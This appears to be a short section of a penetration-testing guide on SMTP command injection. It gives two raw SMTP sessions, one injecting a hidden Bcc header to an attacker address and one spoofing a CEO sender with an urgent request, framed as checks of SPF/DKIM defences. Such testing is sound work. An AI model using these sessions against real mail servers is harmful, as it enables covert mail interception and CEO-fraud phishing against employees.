# Phase 8: SMTP Command Injection

Test for command injection vulnerabilities:

```bash
# Header injection test
MAIL FROM:<attacker@test.com>
RCPT TO:<victim@target.com>
DATA
Subject: Test
Bcc: hidden@attacker.com
X-Injected: malicious-header

Injected content
.
```

Email spoofing test:

```bash
# Spoofed sender (tests SPF/DKIM protection)
MAIL FROM:<ceo@target.com>
RCPT TO:<employee@target.com>
DATA
From: CEO <ceo@target.com>
Subject: Urgent Request
Please process this request immediately.
.
```